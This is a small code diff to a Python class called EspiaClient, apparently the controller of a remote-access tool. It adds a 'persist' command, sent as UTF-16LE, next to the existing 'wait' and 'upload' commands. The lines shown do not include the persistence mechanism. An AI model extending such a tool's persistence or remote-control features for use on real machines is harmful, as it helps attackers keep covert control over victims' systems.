@@ -41,6 +41,8 @@ class EspiaClient(threading.Thread):
             elif (command == "wait"):
                 self.pause()
                 continue
+            elif (command == "persist"):
+                self.connection.send(command.encode("utf-16le"))
             elif (command == ""):
                 pass
             elif (command == "upload"):
